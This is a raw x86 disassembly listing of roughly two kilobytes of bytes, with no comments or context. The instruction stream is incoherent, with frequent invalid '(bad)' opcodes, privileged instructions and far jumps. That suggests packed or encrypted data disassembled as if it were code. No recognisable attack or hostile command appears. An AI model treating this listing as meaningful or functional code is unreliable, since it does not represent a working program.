  4bb501:	cmp    DWORD PTR [esp+edx*1],edi
  4bb504:	pop    eax
  4bb505:	and    cl,BYTE PTR [ebx+0x2437dc4b]
  4bb50b:	stc    
  4bb50c:	sbb    bl,BYTE PTR [esp+eiz*4]
  4bb50f:	push   ebx
  4bb510:	dec    esp
  4bb511:	add    esp,DWORD PTR [edx+esi*2+0x6d90d612]
  4bb518:	xor    BYTE PTR [eax],bh
  4bb51a:	inc    eax
  4bb51b:	push   edx
  4bb51c:	sub    al,0xa0
  4bb51e:	add    ebp,esi
  4bb520:	jecxz  0x4bb4ba
  4bb522:	(bad)  
  4bb523:	mov    ebx,0x23087124
  4bb528:	gs je  0x4bb599
  4bb52b:	jo     0x4bb58e
  4bb52d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bb52e:	lds    esp,FWORD PTR [edi]
  4bb530:	push   ebp
  4bb531:	mov    edi,0xf102cc48
  4bb536:	mov    ch,0x34
  4bb538:	stc    
  4bb539:	xor    BYTE PTR [ebx],dh
  4bb53b:	push   esp
  4bb53c:	add    DWORD PTR [esi+0x43536f44],edx
  4bb542:	add    DWORD PTR [esi+edx*8],eax
  4bb545:	push   esi
  4bb546:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4bb548:	xor    BYTE PTR [eax],bl
  4bb54a:	sbb    BYTE PTR [edi-0x49d498d0],bh
  4bb550:	add    DWORD PTR [esi],0x9a146fb5
  4bb556:	xor    BYTE PTR [ecx+0xa],cl
  4bb559:	mov    ds,WORD PTR [eax]
  4bb55b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bb55c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bb55d:	mov    bh,0xad
  4bb55f:	mov    edi,0xc05f7760
  4bb564:	inc    ecx
  4bb565:	pusha  
  4bb566:	outs   dx,DWORD PTR ds:[esi]
  4bb567:	sub    DWORD PTR [ebx+0x449661d3],ecx
  4bb56d:	lods   al,BYTE PTR ds:[esi]
  4bb56e:	and    al,0x5f
  4bb570:	retf   
  4bb571:	inc    edx
  4bb572:	push   eax
  4bb573:	push   0xfffffff3
  4bb575:	test   BYTE PTR [esi-0x49],bl
  4bb578:	vpunpckhbw xmm6,xmm4,XMMWORD PTR cs:[ebx]
  4bb57d:	daa    
  4bb57e:	push   es
  4bb57f:	pusha  
  4bb580:	inc    ebp
  4bb581:	jnp    0x4bb51c
  4bb583:	sub    al,0x53
  4bb585:	and    al,ah
  4bb587:	add    eax,0xd5c08912
  4bb58c:	inc    esp
  4bb58d:	enter  0x7ba1,0x27
  4bb591:	aas    
  4bb592:	adc    DWORD PTR [edx],edi
  4bb594:	retf   
  4bb595:	sub    al,0x82
  4bb597:	mov    eax,DWORD PTR [ebp+0x14]
  4bb59a:	and    al,0x1a
  4bb59c:	lods   eax,DWORD PTR ds:[esi]
  4bb59d:	sub    eax,0x7ac50542
  4bb5a2:	pushf  
  4bb5a3:	mov    ss,esp
  4bb5a5:	xchg   esi,eax
  4bb5a6:	dec    edi
  4bb5a7:	pushf  
  4bb5a8:	data16 cs int 0x84
  4bb5ac:	pinsrw mm3,WORD PTR [esp+ebx*2+0x850a00a],0x47
  4bb5b5:	sub    al,0x52
  4bb5b8:	sub    BYTE PTR [esi],0x53
  4bb5bb:	cmp    eax,0x4d1d1292
  4bb5c0:	pop    ecx
  4bb5c1:	mov    ch,0x5c
  4bb5c3:	mov    ecx,DWORD PTR [esi-0x25]
  4bb5c6:	sbb    eax,0xf93b7b2f
  4bb5cb:	sbb    cl,BYTE PTR [esi-0x75]
  4bb5ce:	test   BYTE PTR [ebx],al
  4bb5d0:	dec    esp
  4bb5d1:	popf   
  4bb5d2:	inc    esp
  4bb5d3:	xor    al,0x97
  4bb5d5:	adc    al,0xbd
  4bb5d7:	in     al,0xe9
  4bb5d9:	shr    BYTE PTR [esi-0x48],1
  4bb5dc:	repz fcom QWORD PTR [edx]
  4bb5df:	add    BYTE PTR [esi+0x14031800],bl
  4bb5e5:	push   eax
  4bb5e6:	push   ecx
  4bb5e7:	add    BYTE PTR [esi],cl
  4bb5e9:	and    BYTE PTR [ecx-0x4cfcd559],dh
  4bb5ef:	and    edi,edi
  4bb5f1:	and    eax,esi
  4bb5f3:	mov    ebx,DWORD PTR [esi-0x75c386f8]
  4bb5f9:	xor    bh,0xa3
  4bb5fc:	ret    0xde00
  4bb5ff:	adc    al,0xf2
  4bb601:	pop    ebp
  4bb602:	sub    BYTE PTR [eax],ah
  4bb604:	loop   0x4bb5e3
  4bb606:	adc    ebx,DWORD PTR [esi]
  4bb608:	xlat   BYTE PTR ds:[ebx]
  4bb609:	mov    cs,WORD PTR [ebx+0x39]
  4bb60c:	add    esi,DWORD PTR [ecx-0xdf3abbd]
  4bb612:	add    ecx,DWORD PTR [esi+0x247c8949]
  4bb618:	sbb    BYTE PTR [eax],ch
  4bb61a:	and    esp,DWORD PTR [eax]
  4bb61c:	inc    ebp
  4bb61d:	mov    eax,ds:0x489971d1
  4bb622:	mov    cs,WORD PTR [edx]
  4bb624:	shr    DWORD PTR [eax],cl
  4bb626:	adc    al,0xf9
  4bb628:	sub    eax,0x1a8b0868
  4bb62d:	loopne 0x4bb5b5
  4bb62f:	mov    dh,0x92
  4bb631:	stos   DWORD PTR es:[edi],eax
  4bb632:	bound  esi,QWORD PTR [ebx]
  4bb634:	add    al,BYTE PTR [ebp+eax*8-0x56]
  4bb638:	imul   ebp,eax,0xabd8ebcb
  4bb63e:	enter  0x7c41,0xa1
  4bb642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bb643:	popf   
  4bb644:	pop    es
  4bb645:	add    ch,ch
  4bb647:	adc    ch,BYTE PTR [ebx]
  4bb649:	mov    ecx,0x3b0576
  4bb64e:	jp     0x4bb5d8
  4bb650:	inc    esp
  4bb651:	add    eax,0x24f956c1
  4bb656:	(bad)  
  4bb657:	cwde   
  4bb658:	mov    ch,0xfd
  4bb65a:	and    eax,0x8461dd02
  4bb65f:	test   DWORD PTR [ebx+edx*2],ebx
  4bb662:	stos   BYTE PTR es:[edi],al
  4bb663:	sub    al,0x2
  4bb665:	or     DWORD PTR [ecx-0x50],ebp
  4bb668:	mov    dh,0x3
  4bb66a:	pusha  
  4bb66b:	or     DWORD PTR [esi],ebx
  4bb66d:	push   eax
  4bb66e:	inc    esi
  4bb66f:	outs   dx,DWORD PTR ds:[esi]
  4bb670:	xchg   ebp,eax
  4bb671:	push   esi
  4bb672:	sub    dl,ah
  4bb674:	mov    ds:0x240e20b4,al
  4bb679:	and    al,0x18
  4bb67b:	enter  0x949,0xad
  4bb67f:	dec    eax
  4bb680:	adc    BYTE PTR [edi],0xf1
  4bb683:	pop    edi
  4bb684:	push   edi
  4bb685:	imul   edx,ebx,0x44
  4bb688:	sbb    DWORD PTR [ebx],edx
  4bb68a:	or     edx,DWORD PTR [ebx+0x41]
  4bb68d:	push   ebp
  4bb68e:	xchg   edx,eax
  4bb68f:	loopne 0x4bb65d
  4bb691:	test   DWORD PTR [esi-0x54],esp
  4bb694:	push   es
  4bb695:	pop    esp
  4bb696:	jo     0x4bb661
  4bb698:	xchg   edx,eax
  4bb699:	adc    bl,BYTE PTR [ecx+0x3d]
  4bb69c:	push   ss
  4bb69d:	js     0x4bb62c
  4bb69f:	nop
  4bb6a0:	cmp    eax,0x183c4795
  4bb6a5:	adc    eax,0xae1212
  4bb6aa:	mov    dl,0xdc
  4bb6ac:	mov    esi,DWORD PTR ds:[eax]
  4bb6af:	or     esp,DWORD PTR [ebp+eax*1+0x43197031]
  4bb6b6:	pop    eax
  4bb6b7:	pop    edi
  4bb6b8:	leave  
  4bb6b9:	ds mov edx,esi
  4bb6bc:	adc    BYTE PTR ds:0x267344d8,dl
  4bb6c2:	xor    BYTE PTR [ebp-0x6c],cl
  4bb6c5:	adc    DWORD PTR [edx],esp
  4bb6c7:	popf   
  4bb6c8:	cmp    BYTE PTR [eax],0x64
  4bb6cb:	and    BYTE PTR [eiz*1+0x6c70ac45],ch
  4bb6d2:	int3   
  4bb6d3:	xor    eax,0xd4cb4f38
  4bb6d8:	xor    esi,DWORD PTR [edx+eiz*1+0x36]
  4bb6dc:	pop    ebp
  4bb6dd:	adc    DWORD PTR [edi-0x7c7d5a7e],edx
  4bb6e3:	test   ah,ah
  4bb6e5:	aad    0x2d
  4bb6e7:	mov    eax,ds:0x2c1f068d
  4bb6ec:	loop   0x4bb6f5
  4bb6ee:	dec    ebx
  4bb6ef:	jge    0x4bb6e1
  4bb6f1:	jns    0x4bb689
  4bb6f3:	test   BYTE PTR [edx+0x3],dl
  4bb6f6:	inc    ebx
  4bb6f7:	jge    0x4bb717
  4bb6f9:	hlt    
  4bb6fa:	adc    dl,bl
  4bb6fc:	mov    dl,BYTE PTR [ebx+ebx*2]
  4bb6ff:	push   ebp
  4bb700:	or     ebp,DWORD PTR [edx-0x76a7f34d]
  4bb706:	aad    0xfa
  4bb708:	mov    esi,0xec7b2982
  4bb70d:	lods   al,BYTE PTR ds:[esi]
  4bb70e:	jb     0x4bb697
  4bb710:	inc    ebp
  4bb711:	push   es
  4bb712:	mov    esi,0x4d8496e7
  4bb717:	inc    edx
  4bb718:	sbb    eax,DWORD PTR [edi+0x26]
  4bb71b:	or     al,0x6a
  4bb71d:	lock lods al,BYTE PTR ds:[esi]
  4bb71f:	xor    DWORD PTR [esi-0x72],0x79cc288a
  4bb726:	retf   0x809a
  4bb729:	add    eax,0x2297590d
  4bb72e:	es jnp 0x4bb70e
  4bb731:	add    BYTE PTR [edx-0x75],dl
  4bb734:	xchg   edx,eax
  4bb735:	xchg   edx,eax
  4bb736:	sbb    al,0xbd
  4bb738:	or     DWORD PTR [esi+0x57],esi
  4bb73b:	repnz not esi
  4bb73e:	mov    WORD PTR [ecx+0x1f469bd9],cs
  4bb744:	retf   
  4bb745:	ret    
  4bb746:	pop    ecx
  4bb747:	test   DWORD PTR [edx-0x39],ecx
  4bb74a:	and    BYTE PTR [esi+0x42],dl
  4bb74d:	adc    al,0xc
  4bb74f:	or     al,0x42
  4bb751:	push   ecx
  4bb752:	jg     0x4bb75e
  4bb754:	or     BYTE PTR [esp+0x5c3f750e],bh
  4bb75b:	sbb    BYTE PTR [eax-0x1cd3929],dl
  4bb761:	out    dx,eax
  4bb762:	add    DWORD PTR [eax-0x54],edx
  4bb765:	sub    DWORD PTR [ecx+0x1057b9c],ebp
  4bb76b:	pop    ebx
  4bb76c:	jmp    0x4bb709
  4bb76e:	xor    ah,BYTE PTR [edx]
  4bb770:	inc    ebx
  4bb772:	sbb    DWORD PTR ss:[esi+0x515f4ec4],0x781f7121
  4bb77d:	add    ecx,esi
  4bb77f:	pop    ecx
  4bb780:	outs   dx,BYTE PTR ds:[esi]
  4bb781:	in     eax,0xcb
  4bb783:	mov    esp,0xd709a040
  4bb788:	cmp    BYTE PTR [ebx-0x30],bl
  4bb78b:	push   cs
  4bb78c:	dec    ebp
  4bb78d:	dec    edx
  4bb78e:	call   0xa68dafa3
  4bb793:	add    BYTE PTR [eax+ecx*1-0x7e],ch
  4bb797:	xchg   edi,eax
  4bb798:	(bad)  
  4bb799:	adc    BYTE PTR ss:[ecx],cl
  4bb79c:	adc    BYTE PTR [edi+0x27],0x64
  4bb7a0:	xchg   edi,eax
  4bb7a1:	xchg   edx,eax
  4bb7a2:	pop    esi
  4bb7a3:	jns    0x4bb7c8
  4bb7a5:	and    cl,BYTE PTR [eax+eiz*2+0x552be055]
  4bb7ac:	push   edx
  4bb7ad:	dec    ecx
  4bb7ae:	rcr    BYTE PTR [ecx+0x53185ccc],0x18
  4bb7b5:	push   ecx
  4bb7b6:	or     al,0x48
  4bb7b8:	adc    bl,BYTE PTR [esi+0x48]
  4bb7bb:	mov    dl,0xb3
  4bb7bd:	orps   xmm4,XMMWORD PTR [ecx-0x3c6e1d0d]
  4bb7c4:	mov    ds:0x149c04bb,al
  4bb7c9:	mov    cl,0x90
  4bb7cb:	push   esi
  4bb7cc:	mov    eax,ecx
  4bb7ce:	cmp    al,0x4a
  4bb7d0:	mov    al,0xb1
  4bb7d2:	sbb    eax,0xda54a14
  4bb7d7:	mov    ecx,0x7a800c01
  4bb7dc:	inc    ebp
  4bb7dd:	push   ds
  4bb7de:	xor    ch,BYTE PTR [eax+edx*4-0x44cac4b0]
  4bb7e5:	ret    
  4bb7e6:	jo     0x4bb7ea
  4bb7e8:	jl     0x4bb825
  4bb7ea:	jg     0x4bb812
  4bb7ec:	sbb    dh,BYTE PTR [edi]
  4bb7ee:	push   edx
  4bb7ef:	fadd   DWORD PTR [eax+ecx*2]
  4bb7f2:	mov    ds:0xc4c6d333,al
  4bb7f7:	daa    
  4bb7f8:	inc    eax
  4bb7f9:	jne    0x4bb805
  4bb7fb:	jle    0x4bb7bd
  4bb7fd:	sbb    DWORD PTR [eax],ebx
  4bb7ff:	inc    eax
  4bb800:	loop   0x4bb78d
  4bb802:	cmp    al,0x13
  4bb804:	jne    0x4bb822
  4bb806:	sub    DWORD PTR [ecx-0x5f],eax
  4bb809:	rcl    DWORD PTR [eax+0x3c],1
  4bb80c:	adc    BYTE PTR [ebx+0x41890cad],al
  4bb812:	imul   esp,DWORD PTR [edx+0x44],0x5e62442a
  4bb819:	xor    bh,bl
  4bb81b:	mov    al,0x52
  4bb81d:	and    bl,BYTE PTR [esi+0x296b553c]
  4bb823:	pusha  
  4bb824:	popa   
  4bb825:	out    0x59,al
  4bb827:	push   0xffffffc8
  4bb829:	pop    ebp
  4bb82a:	push   ss
  4bb82b:	jp     0x4bb7ee
  4bb82d:	sub    BYTE PTR ds:0xa67df8ae,cl
  4bb833:	inc    ebx
  4bb834:	and    bh,BYTE PTR [ebx+0x10]
  4bb837:	add    DWORD PTR [ebx+0x4cda030f],ecx
  4bb83d:	push   es
  4bb83e:	push   eax
  4bb83f:	cmp    BYTE PTR [eax+edx*1+0x60584258],dl
  4bb846:	push   edx
  4bb847:	lods   eax,DWORD PTR ds:[esi]
  4bb848:	(bad)  
  4bb849:	imul   ecx,DWORD PTR [ecx],0x16f8c19b
  4bb84f:	daa    
  4bb850:	jecxz  0x4bb854
  4bb852:	das    
  4bb853:	into   
  4bb854:	jne    0x4bb821
  4bb856:	mov    ah,0x9e
  4bb858:	mov    ebp,0xb366c703
  4bb85d:	es mov edi,0x339df1b1
  4bb863:	and    BYTE PTR [eax+eiz*1+0x6a],ch
  4bb867:	and    BYTE PTR [ecx+eax*2-0x43],cl
  4bb86b:	cdq    
  4bb86c:	dec    ecx
  4bb86d:	push   ebp
  4bb86e:	rcl    BYTE PTR [ecx-0x49b8c794],0x9b
  4bb875:	fisubr DWORD PTR [ebx+0x56]
  4bb878:	inc    edx
  4bb879:	cmp    BYTE PTR [ecx-0x3d],dh
  4bb87c:	push   cs
  4bb87d:	or     al,0xb7
  4bb87f:	adc    BYTE PTR [esi+0x49011b81],0x30
  4bb886:	add    al,0x84
  4bb888:	xchg   BYTE PTR [edx],al
  4bb88a:	(bad)  
  4bb88b:	or     edx,edi
  4bb88d:	jmp    0xf426:0x660682a8
  4bb894:	rcl    DWORD PTR [esi+0x7],0xaa
  4bb898:	push   edx
  4bb899:	cmp    al,0x1c
  4bb89b:	and    ecx,DWORD PTR [ecx]
  4bb89d:	ret    
  4bb89e:	test   eax,0xd0c8e329
  4bb8a3:	pop    ecx
  4bb8a4:	retf   0x3f88
  4bb8a7:	ror    BYTE PTR gs:[edi+edi*2],1
  4bb8ab:	pop    edi
  4bb8ac:	pop    ss
  4bb8ad:	sub    al,0x11
  4bb8af:	out    dx,eax
  4bb8b0:	cdq    
  4bb8b1:	or     esi,0x40c3314b
  4bb8b7:	ja     0x4bb912
  4bb8b9:	sbb    eax,0xbdc07d02
  4bb8be:	cmp    eax,0x88de3922
  4bb8c3:	(bad)  
  4bb8c4:	je     0x4bb8cc
  4bb8c6:	call   0x2ac0:0xcb1a1b13
  4bb8cd:	push   ebp
  4bb8ce:	jge    0x4bb8bd
  4bb8d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bb8d1:	rol    DWORD PTR [ebx+0x4c],0x55
  4bb8d5:	mov    BYTE PTR [esi+eax*2-0x4e],al
  4bb8d9:	jle    0x4bb881
  4bb8db:	jle    0x4bb870
  4bb8dd:	push   esp
  4bb8de:	test   dl,0xeb
  4bb8e1:	push   es
  4bb8e2:	mov    ebp,0x7a31573
  4bb8e7:	xchg   esi,eax
  4bb8e8:	in     al,0x41
  4bb8ea:	popf   
  4bb8eb:	xor    eax,0x43463738
  4bb8f0:	sbb    al,BYTE PTR [esi+ebp*4]
  4bb8f3:	sbb    BYTE PTR [eax+0x61],0x3
  4bb8f7:	mov    es,WORD PTR [ebx]
  4bb8f9:	dec    esi
  4bb8fa:	shr    DWORD PTR [esi],1
  4bb8fc:	dec    esi
  4bb8fd:	ror    edx,cl
  4bb8ff:	cmp    bh,BYTE PTR [ebx]
  4bb901:	cmp    eax,DWORD PTR [edx]
  4bb903:	mov    ebx,0xb052a87a
  4bb908:	adc    BYTE PTR [ecx+0x152c48f6],ah
  4bb90e:	or     esi,DWORD PTR [eax]
  4bb910:	fist   WORD PTR [ebx-0x4a49fa40]
  4bb916:	and    al,0x22
  4bb918:	jbe    0x4bb94a
  4bb91a:	push   esi
  4bb91b:	aaa    
  4bb91c:	test   al,0x75
  4bb91e:	leave  
  4bb91f:	addr16 out 0x8b,eax
  4bb922:	pop    edi
  4bb923:	ja     0x4bb8c7
  4bb925:	or     al,0x17
  4bb927:	cdq    
  4bb928:	(bad)  
  4bb929:	js     0x4bb967
  4bb92b:	dec    esi
  4bb92c:	sbb    edx,ebp
  4bb92e:	xchg   esi,eax
  4bb92f:	cmp    BYTE PTR [ebx],0xed
  4bb932:	inc    ebx
  4bb933:	sub    al,0x3e
  4bb935:	and    al,0xc
  4bb937:	sbb    eax,0x4a6c5867
  4bb93c:	add    DWORD PTR [eax-0x2c],ecx
  4bb93f:	or     DWORD PTR [edi+edi*8-0x2d],esp
  4bb943:	pusha  
  4bb944:	pause  
  4bb946:	cmp    bl,bh
  4bb948:	les    esi,FWORD PTR [ebx+0x43]
  4bb94b:	sysret 
  4bb94d:	out    0xc3,eax
  4bb94f:	xor    bl,dl
  4bb951:	call   DWORD PTR ds:0xf575ca21
  4bb957:	mov    ah,0x5
  4bb959:	lds    ebx,FWORD PTR [edi]
  4bb95b:	mov    bl,dh
  4bb95d:	and    bh,BYTE PTR [ecx*8+0x527262a0]
  4bb964:	sbb    BYTE PTR [edi+0x6e4d041a],0xa
  4bb96b:	push   esi
  4bb96c:	fadd   DWORD PTR [ecx+0x3b1adabc]
  4bb972:	jg     0xc5db45f3
  4bb978:	xor    BYTE PTR [edi+0x26979c97],dh
  4bb97e:	mov    dl,0x87
  4bb980:	arpl   WORD PTR [ebx+0x72],sp
  4bb983:	retf   
  4bb984:	shl    BYTE PTR [ecx-0x1ea9879c],0x8b
  4bb98b:	inc    esp
  4bb98c:	cmp    eax,0x703980f3
  4bb991:	xor    BYTE PTR [ebp+0x48],dh
  4bb994:	or     eax,0xb0660d03
  4bb999:	adc    al,0x94
  4bb99b:	rcr    BYTE PTR [eax-0x30],cl
  4bb99e:	inc    edx
  4bb99f:	popa   
  4bb9a0:	(bad)  
  4bb9a1:	cwde   
  4bb9a2:	call   0xa6d8ec3b
  4bb9a7:	ds pop edx
  4bb9a9:	jmp    0x4bb935
  4bb9ab:	dec    edx
  4bb9ac:	dec    ebp
  4bb9ad:	push   es
  4bb9ae:	lods   al,BYTE PTR ds:[esi]
  4bb9af:	xor    esi,DWORD PTR [ebp+0x60]
  4bb9b2:	push   ebx
  4bb9b3:	les    eax,FWORD PTR [ebx]
  4bb9b5:	clc    
  4bb9b6:	mov    eax,DWORD PTR [edx+0x40e34e0]
  4bb9bc:	sbb    bh,BYTE PTR [ebp-0x59e43757]
  4bb9c2:	pusha  
  4bb9c3:	aas    
  4bb9c4:	shl    BYTE PTR [esi+0x58afa4b2],cl
  4bb9ca:	inc    edi
  4bb9cb:	cld    
  4bb9cc:	jle    0x4bb957
  4bb9ce:	adc    DWORD PTR [eax],eax
  4bb9d0:	mov    dl,0xa4
  4bb9d2:	add    al,0x12
  4bb9d4:	jns    0x4bb9ec
  4bb9d6:	add    edi,DWORD PTR [ebp+esi*8+0x387210a8]
  4bb9dd:	cs sbb dh,ch
  4bb9e0:	and    ah,BYTE PTR [edi+eax*1]
  4bb9e3:	or     dh,al
  4bb9e5:	sti    
  4bb9e6:	mov    ebp,0x24599a9e
  4bb9eb:	or     ebx,DWORD PTR [eax-0x399ea184]
  4bb9f1:	call   0xc816:0xe61d97f
  4bb9f8:	or     eax,0xf85e36c7
  4bb9fd:	mov    ah,0xd2
  4bb9ff:	test   al,0x33
  4bba01:	inc    ebx
  4bba02:	push   edi
  4bba03:	scas   eax,DWORD PTR es:[edi]
  4bba04:	adc    edi,DWORD PTR [ecx+0x3c]
  4bba07:	dec    ecx
  4bba08:	add    eax,DWORD PTR [ebx+0x3e74a943]
  4bba0e:	add    al,0x53
  4bba10:	fisub  DWORD PTR [eax-0x420b32b6]
  4bba16:	cmovns edi,DWORD PTR [eax+0x1e8b8c0e]
  4bba1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bba1e:	stos   BYTE PTR es:[edi],al
  4bba1f:	test   BYTE PTR [ecx+0x3],0x37
  4bba23:	adc    BYTE PTR [ebx+0x44],0x0
  4bba27:	adc    dl,BYTE PTR [ecx-0x2ffd4335]
  4bba2d:	add    al,0xc7
  4bba2f:	push   es
  4bba30:	fadd   QWORD PTR [edi+0x48ab4d45]
  4bba36:	pop    es
  4bba37:	test   eax,0xb7352bb0
  4bba3c:	mov    esi,0x16d01a1f
  4bba41:	inc    edi
  4bba42:	add    BYTE PTR [edi+0x6],dh
  4bba45:	cmp    BYTE PTR [edx],bl
  4bba47:	pushf  
  4bba48:	(bad)  
  4bba4a:	jl     0x4bbaa6
  4bba4c:	sbb    BYTE PTR [esi],dl
  4bba4e:	mov    eax,0x1b1014d9
  4bba53:	xchg   ebp,eax
  4bba54:	xchg   esp,eax
  4bba55:	adc    al,0xf1
  4bba57:	pop    ebx
  4bba58:	xchg   edi,eax
  4bba59:	add    eax,esp
  4bba5b:	pop    eax
  4bba5c:	and    eax,ebx
  4bba5e:	mov    bh,0x82
  4bba60:	add    eax,0xe4b12f00
  4bba65:	push   cs
  4bba66:	dec    edx
  4bba67:	mov    eax,ds:0x5dc28156
  4bba6c:	and    BYTE PTR [ecx+0x55],bh
  4bba6f:	mov    ch,0x41
  4bba71:	lahf   
  4bba72:	adc    al,0x54
  4bba74:	nop
  4bba75:	adc    eax,0xa50b1174
  4bba7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bba7b:	xor    DWORD PTR [ecx],edx
  4bba7d:	mov    ch,0x14
  4bba7f:	adc    BYTE PTR ds:[esp+esi*4+0x6858c1a1],ch
  4bba87:	pop    es
  4bba88:	(bad)  
  4bba89:	dec    esp
  4bba8a:	add    bh,BYTE PTR [edi-0x72d2e53b]
  4bba90:	jno    0x4bbaa3
  4bba92:	fild   DWORD PTR [edx+0x6b57e8b4]
  4bba98:	sbb    eax,DWORD PTR [ebx+0x4]
  4bba9b:	mov    ds:0x2879731c,eax
  4bbaa0:	xor    BYTE PTR [ebp+0x68],dh
  4bbaa3:	aam    0x1
  4bbaa5:	dec    edi
  4bbaa6:	push   es
  4bbaa7:	div    DWORD PTR [edi+eax*1]
  4bbaaa:	and    eax,0xc7836a1d
  4bbaaf:	jmp    0xd39:0xfcba8fa1
  4bbab6:	xchg   esp,eax
  4bbab7:	jne    0x4bbad4
  4bbab9:	scas   al,BYTE PTR es:[edi]
  4bbaba:	sub    DWORD PTR [edi],eax
  4bbabc:	mov    ds:0x1c26c719,al
  4bbac1:	xchg   ecx,eax
  4bbac2:	push   ebp
  4bbac3:	call   0x1fd2:0x42223d96
  4bbaca:	pop    esp
  4bbacb:	shr    BYTE PTR [eax-0x5be37bd9],cl
  4bbad1:	push   ss
  4bbad2:	je     0x4bbac5
  4bbad4:	fsub   DWORD PTR [ebx-0x49]
  4bbad7:	xor    ch,BYTE PTR [ebx]
  4bbad9:	mov    DWORD PTR [edx],esi
  4bbadb:	adc    eax,0x9487128b
  4bbae0:	and    BYTE PTR [esp],dl
  4bbae3:	xchg   ecx,eax
  4bbae4:	icebp  
  4bbae5:	and    esp,DWORD PTR [ebp+eax*1+0x4380ca0c]
  4bbaec:	test   ebx,0xb4b5d952
  4bbaf2:	scas   eax,DWORD PTR es:[edi]
  4bbaf3:	push   es
  4bbaf4:	sbb    ecx,DWORD PTR [eax]
  4bbaf6:	add    BYTE PTR [ecx+ebx*1],al
  4bbaf9:	outs   dx,BYTE PTR ds:[esi]
  4bbafa:	dec    edx
  4bbafb:	sbb    BYTE PTR [ecx+0x1a3c4200],ah
  4bbb01:	lods   eax,DWORD PTR ds:[esi]
  4bbb02:	test   BYTE PTR [eax+eax*2],0xb9
  4bbb06:	test   al,0x48
  4bbb08:	loop   0x4bbb0a
  4bbb0a:	pop    ebx
  4bbb0b:	test   BYTE PTR [ecx+0x6a],dl
  4bbb0e:	or     al,0x2d
  4bbb10:	push   0x4ef309b4
  4bbb15:	adc    eax,0x40b8cd88
  4bbb1a:	xor    DWORD PTR fs:[ecx-0x4afa0b4e],esp
  4bbb21:	xchg   BYTE PTR [ebp-0x18],bl
  4bbb24:	adc    al,0x2c
  4bbb26:	das    
  4bbb27:	les    edx,FWORD PTR [edx]
  4bbb29:	lods   eax,DWORD PTR ds:[esi]
  4bbb2a:	mov    eax,ds:0xf122207b
  4bbb2f:	sbb    BYTE PTR [esi-0x16d223dc],0xea
  4bbb36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bbb37:	dec    ebp
  4bbb38:	xchg   esp,eax
  4bbb39:	jno    0x4bbb0c
  4bbb3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bbb3c:	mov    ebx,0x48ef07d5
  4bbb41:	add    edi,edx
  4bbb43:	leave  
  4bbb44:	shl    esp,cl
  4bbb46:	push   0x8
  4bbb48:	sub    eax,DWORD PTR [ebx]
  4bbb4a:	mov    dh,BYTE PTR [esi]
  4bbb4c:	ret    
  4bbb4d:	rol    BYTE PTR [ecx],1
  4bbb4f:	cli    
  4bbb50:	and    eax,0xfb5c2bd0
  4bbb55:	push   edi
  4bbb56:	es je  0x4bbb2c
  4bbb59:	sub    ecx,eax
  4bbb5b:	enter  0xc0,0x3
  4bbb5f:	stc    
  4bbb60:	cmp    edx,0x92acea0f
  4bbb66:	xchg   edx,eax
  4bbb67:	out    0x4,al
  4bbb69:	inc    ebx
  4bbb6a:	add    edi,eax
  4bbb6c:	loop   0x4bbb6e
  4bbb6e:	sbb    al,0x29
  4bbb70:	enter  0x9cf8,0x92
  4bbb74:	mov    fs,WORD PTR ds:0x1e4803f6
  4bbb7a:	push   0x180ed2aa
  4bbb7f:	sbb    dl,al
  4bbb81:	sub    eax,0x29a8b6d
  4bbb86:	adc    edi,0x38
  4bbb89:	dec    ebx
  4bbb8a:	(bad)  
  4bbb8b:	out    0xb0,al
  4bbb8d:	in     al,dx
  4bbb8e:	adc    al,0x3
  4bbb90:	xor    dh,BYTE PTR ds:0xe7936240
  4bbb96:	dec    edx
  4bbb97:	pop    ebp
  4bbb98:	adc    dl,dl
  4bbb9a:	xor    eax,0x6943453c
  4bbb9f:	call   0x18f0:0x863ae41
  4bbba6:	clc    
  4bbba7:	sbb    al,0xd6
  4bbba9:	es xor al,0x10
  4bbbac:	xchg   ebp,eax
  4bbbad:	jle    0x4bbbd0
  4bbbaf:	sub    BYTE PTR [esp+ebp*1],al
  4bbbb2:	adc    DWORD PTR [ecx],ebx
  4bbbb4:	xchg   ecx,eax
  4bbbb5:	neg    eax
  4bbbb7:	pusha  
  4bbbb8:	xor    DWORD PTR [ecx+0x8],ecx
  4bbbbb:	es and eax,0xfd29a89d
  4bbbc2:	push   ebp
  4bbbc3:	and    BYTE PTR [eax-0x348b65ad],dh
  4bbbc9:	shl    BYTE PTR [edx],0x6a
  4bbbcc:	nop
  4bbbcd:	add    bl,BYTE PTR [eax+edi*2+0x70]
  4bbbd1:	xor    eax,0x61f22b3c
  4bbbd6:	sbb    BYTE PTR [ecx+0x4054f19a],dh
  4bbbdc:	xchg   ecx,eax
  4bbbdd:	push   ds
  4bbbde:	mov    bh,0xf7
  4bbbe0:	and    BYTE PTR [edi-0x6e],dl
  4bbbe3:	push   0x504779c4
  4bbbe8:	call   0xf598:0x6ca3e88c
  4bbbef:	mul    ah
  4bbbf1:	push   eax
  4bbbf2:	adc    dh,BYTE PTR [ecx+0x5afcc556]
  4bbbf8:	popa   
  4bbbf9:	(bad)
  4bbbfd:	popf   
  4bbbfe:	idiv   DWORD PTR [edx]
  4bbc00:	jcxz   0x4bbba8
  4bbc03:	mov    WORD PTR gs:[edi-0x40],es
  4bbc07:	push   0xffffffeb
  4bbc09:	rcr    BYTE PTR [eax],0xa9
  4bbc0c:	sub    al,0x3b
  4bbc0e:	push   ebx
  4bbc0f:	and    al,0x55
  4bbc11:	add    BYTE PTR [edx],cl
  4bbc13:	rcl    dl,0x3c
  4bbc16:	jns    0x4bbc84
  4bbc18:	dec    ecx
  4bbc19:	mov    edi,0x1d407ea4
  4bbc1e:	add    BYTE PTR [eax+0x68],bh
  4bbc21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bbc22:	cdq    
  4bbc23:	xor    al,dh
  4bbc25:	inc    ebp
  4bbc26:	xor    al,0x44
  4bbc28:	jmp    0x2f4d0879
  4bbc2d:	sbb    BYTE PTR [ecx],dl
